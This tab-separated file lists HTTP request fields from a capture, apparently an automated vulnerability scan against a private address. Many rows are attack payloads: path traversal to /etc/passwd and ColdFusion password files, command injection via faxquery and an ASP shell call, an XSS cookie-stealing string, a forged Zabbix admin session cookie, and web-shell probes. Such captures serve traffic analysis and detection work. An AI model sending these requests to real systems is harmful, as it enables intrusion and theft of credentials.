http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.104															1	http://192.168.1.104/struts2-blank/example/HelloWorld.action		GET				HTTP/1.1																							/struts2-blank/example/HelloWorld.action
																											192.168.1.104															1	http://192.168.1.104/?Class.classLoader.resources.cacheObjectMaxSize=foo		GET				HTTP/1.1																							/?Class.classLoader.resources.cacheObjectMaxSize=foo
																											iamahost															1	http://iamahost/common/index.jsf		GET				HTTP/1.1																							/common/index.jsf
																											192.168.1.104															1	http://192.168.1.104/server-status?refresh=1;http://example.com		GET				HTTP/1.1																							/server-status?refresh=1;http://example.com
																											<img src="" onerror="alert(document.cookie)">															1	http://<img src="" onerror="alert(document.cookie)">/spiffymcgee.rpd7		GET				HTTP/1.1																							/spiffymcgee.rpd7
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/rpm_query		GET				HTTP/1.1																							/cgi-bin/rpm_query
																											192.168.1.104															1	http://192.168.1.104/jkstatus/		GET				HTTP/1.1																							/jkstatus/
																											192.168.1.104															1	http://192.168.1.104/Orion/Login.aspx		GET				HTTP/1.1																							/Orion/Login.aspx
																			176	176	text/xml						192.168.1.104															1	http://192.168.1.104/xmlrpc.php		POST				HTTP/1.1																							/xmlrpc.php
																			0	0	/*						192.168.1.104															1	http://192.168.1.104/cgi-bin/test-cgi		POST				HTTP/1.1																							/cgi-bin/test-cgi
																											192.168.1.104															1	http://192.168.1.104/server-status?auto		GET				HTTP/1.1																							/server-status?auto
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/view-source?../../../../../../../etc/passwd		GET				HTTP/1.1																							/cgi-bin/view-source?../../../../../../../etc/passwd
																											192.168.1.104															1	http://192.168.1.104/server-status?auto		GET				HTTP/1.1																							/server-status?auto
																											192.168.1.104															1	http://192.168.1.104/Orion/Login.aspx		GET				HTTP/1.1																							/Orion/Login.aspx
																			14	14	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/lucee/admin/ext.applications.upload.cfm		POST				HTTP/1.1																							/lucee/admin/ext.applications.upload.cfm
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/php.ini		GET				HTTP/1.1																							/cgi-bin/php.ini
																											192.168.1.104															1	http://192.168.1.104/Telerik.Web.UI.WebResource.axd?type=rau		GET				HTTP/1.1																							/Telerik.Web.UI.WebResource.axd?type=rau
																											192.168.1.104															1	http://192.168.1.104/crossdomain.xml		GET				HTTP/1.1																							/crossdomain.xml
																											192.168.1.104															1	http://192.168.1.104/Orion/Login.aspx		GET				HTTP/1.1																							/Orion/Login.aspx
																											192.168.1.104															1	http://192.168.1.104/imc/fault/accessMgrServlet		GET				HTTP/1.1																							/imc/fault/accessMgrServlet
																											192.168.1.104															1	http://192.168.1.104/CFIDE/administrator/		GET				HTTP/1.1																							/CFIDE/administrator/
																			21	21	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/cgi/login		POST				HTTP/1.1																							/cgi/login
																											192.168.1.104															1	http://192.168.1.104/CFIDE/scheduler/		GET				HTTP/1.1																							/CFIDE/scheduler/
																											192.168.1.104															1	http://192.168.1.104http://www.google.com:80/		HEAD				HTTP/1.1																							http://www.google.com:80/
																			41	41	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/index.htm		POST				HTTP/1.1																							/index.htm
																			23	23	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/openam/oauth2/..;/ccversion/Version		POST				HTTP/1.1																							/openam/oauth2/..;/ccversion/Version
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/printenv.pl		GET				HTTP/1.1																							/cgi-bin/printenv.pl
																											192.168.1.104															1	http://192.168.1.104/CFIDE/adminiapi/		GET				HTTP/1.1																							/CFIDE/adminiapi/
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/htmlscript?../../../../../../../etc/passwd		GET				HTTP/1.1																							/cgi-bin/htmlscript?../../../../../../../etc/passwd
																											192.168.1.104															1	http://192.168.1.104/c99.php		GET				HTTP/1.1																							/c99.php
																											192.168.1.104															1	http://192.168.1.104/conf/ssl/apache/integrity.key		GET				HTTP/1.1																							/conf/ssl/apache/integrity.key
																											192.168.1.104															1	http://192.168.1.104/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=CFIDE.componentutils.cfcexplorer&path=../../../license.txt		GET				HTTP/1.1																							/CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=CFIDE.componentutils.cfcexplorer&path=../../../license.txt
																											192.168.1.104															1	http://192.168.1.104/CFIDE/AIR/		GET				HTTP/1.1																							/CFIDE/AIR/
																											192.168.1.104															1	http://192.168.1.104/Orion/Login.aspx		GET				HTTP/1.1																							/Orion/Login.aspx
																											192.168.1.104									797						1	http://192.168.1.104/phpinfo.php		GET				HTTP/1.1																							/phpinfo.php
																			25	25	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/data/login		POST				HTTP/1.1																							/data/login
																											192.168.1.104															1	http://192.168.1.104/CFIDE/servermanager/		GET				HTTP/1.1																							/CFIDE/servermanager/
																											192.168.1.104															1	http://192.168.1.104/CFIDE/adminapi/customtags/soft404validationcheck.cfm		GET				HTTP/1.1																							/CFIDE/adminapi/customtags/soft404validationcheck.cfm
																											192.168.1.104															1	http://192.168.1.104/go/add-on/business-continuity/api/cruise_config		GET				HTTP/1.1																							/go/add-on/business-continuity/api/cruise_config
																											192.168.1.104															1	http://192.168.1.104/phpmyadmin/		GET				HTTP/1.1																							/phpmyadmin/
																											192.168.1.104															1	http://192.168.1.104/CFIDE/orm/		GET				HTTP/1.1																							/CFIDE/orm/
																			59	59	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/CFIDE/adminapi/administrator.cfc?		POST				HTTP/1.1																							/CFIDE/adminapi/administrator.cfc?
																											192.168.1.104															1	http://192.168.1.104/CFIDE/wizards/common/		GET				HTTP/1.1																							/CFIDE/wizards/common/
																											192.168.1.104															1	http://192.168.1.104/AdvWorks/equipment/catalog_type.asp?ProductType=|shell(%22c:cmd.exe%22)|		GET				HTTP/1.1																							/AdvWorks/equipment/catalog_type.asp?ProductType=|shell(%22c:cmd.exe%22)|
																											192.168.1.104															1	http://192.168.1.104/CFIDE/componentutils/		GET				HTTP/1.1																							/CFIDE/componentutils/
																											192.168.1.104															1	http://192.168.1.104/ui/vropspluginui/rest/services/getstatus		GET				HTTP/1.1																							/ui/vropspluginui/rest/services/getstatus
																			2295	2295	application/xml						192.168.1.104															1	http://192.168.1.104/		POST				HTTP/1.1																							/
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/awstats.pl?debug=1		GET				HTTP/1.1																							/cgi-bin/awstats.pl?debug=1
																											192.168.1.104															1	http://192.168.1.104/index_sso.php		GET				HTTP/1.1																						zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9	/index_sso.php
																											192.168.1.104															1	http://192.168.1.104/README.txt		GET				HTTP/1.1																							/README.txt
																			21	21	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/_vti_bin/_vti_aut/author.dll		GET				HTTP/1.1																							/_vti_bin/_vti_aut/author.dll
																											localhost															1	http://localhost/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=test&attributes.file=../../administrator/mail/download.cfm&filename=../../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=test		GET				HTTP/1.1																							/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=test&attributes.file=../../administrator/mail/download.cfm&filename=../../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=test
																											192.168.1.104															1	http://192.168.1.104/~bin/true		GET				HTTP/1.1																							/~bin/true
																			5	5	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/createou		POST				HTTP/1.1																							/createou
																											192.168.1.104									945						1	http://192.168.1.104/cgi-bin/awstats/awstats.pl?PluginMode=:print+%22x%22%2e(1042+%2b+1099)%2e%22x%22;		GET				HTTP/1.1																							/cgi-bin/awstats/awstats.pl?PluginMode=:print+%22x%22%2e(1042+%2b+1099)%2e%22x%22;
																			738	738	text/xml						192.168.1.104									946						1	http://192.168.1.104/flex2gateway/httpsecure		POST				HTTP/1.1																							/flex2gateway/httpsecure
																											192.168.1.104															1	http://192.168.1.104/		TRACE				HTTP/1.1																						vulnerable=yes	/
																											<img src="" onerror="alert(document.cookie)">															1	http://<img src="" onerror="alert(document.cookie)">/spiffymcgee.rpd7		GET				HTTP/1.1																							/spiffymcgee.rpd7
																											192.168.1.104															1	http://192.168.1.104/cgi-bin/htgrep/file=index.html&hdr=/etc/passwd		GET				HTTP/1.1																							/cgi-bin/htgrep/file=index.html&hdr=/etc/passwd
																			295	295	application/xml						192.168.1.104															1	http://192.168.1.104/autodiscover		POST				HTTP/1.1																							/autodiscover
																											192.168.1.104															1	http://192.168.1.104/CFIDE/websocket/		GET				HTTP/1.1																							/CFIDE/websocket/
																											192.168.1.104															1	http://192.168.1.104/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/		GET				HTTP/1.1																							/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
																											192.168.1.104															1	http://192.168.1.104/bb/		GET				HTTP/1.1																							/bb/
																											192.168.1.104															1	http://192.168.1.104/struts2-showcase/employee/save.action		GET				HTTP/1.1																							/struts2-showcase/employee/save.action
																			738	738	text/xml						192.168.1.104									1211						1	http://192.168.1.104/messagebroker/http		POST				HTTP/1.1																							/messagebroker/http
																											192.168.1.104															1	http://192.168.1.104/?class.classLoader.resources.cacheObjectMaxSize=foo		GET				HTTP/1.1																							/?class.classLoader.resources.cacheObjectMaxSize=foo
																											192.168.1.104									979						1	http://192.168.1.104/cgi-bin/faxquery?/bin/cat%20/etc/passwd		GET				HTTP/1.1																							/cgi-bin/faxquery?/bin/cat%20/etc/passwd
																											192.168.1.104															1	http://192.168.1.104/CFIDE/portlets/		GET				HTTP/1.1																							/CFIDE/portlets/
																			27	27	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/./RestAPI/LogonCustomization		POST				HTTP/1.1																							/./RestAPI/LogonCustomization
																											192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																							/
																			738	738	text/xml						192.168.1.104									1279						1	http://192.168.1.104/messagebroker/httpsecure		POST				HTTP/1.1																							/messagebroker/httpsecure
																											192.168.1.104															1	http://192.168.1.104/CFIDE/appdeployment/		GET				HTTP/1.1																							/CFIDE/appdeployment/
																			738	738	text/xml						192.168.1.104									1310						1	http://192.168.1.104/blazeds/messagebroker/http		POST				HTTP/1.1																							/blazeds/messagebroker/http
																			176	176	text/xml						192.168.1.104									1009						1	http://192.168.1.104/serendipity/serendipity_xmlrpc.php		POST				HTTP/1.1																							/serendipity/serendipity_xmlrpc.php
																											192.168.1.104															1	http://192.168.1.104/Orion/Login.aspx		GET				HTTP/1.1																							/Orion/Login.aspx
																											192.168.1.104															1	http://192.168.1.104/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=localhost&vport=22&vstart=&vusername=&vpassword=&returnformat=json		GET				HTTP/1.1																							/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=localhost&vport=22&vstart=&vusername=&vpassword=&returnformat=json
																											192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																							/
																											192.168.1.104															1	http://192.168.1.104/CFIDE/services/		GET				HTTP/1.1																							/CFIDE/services/
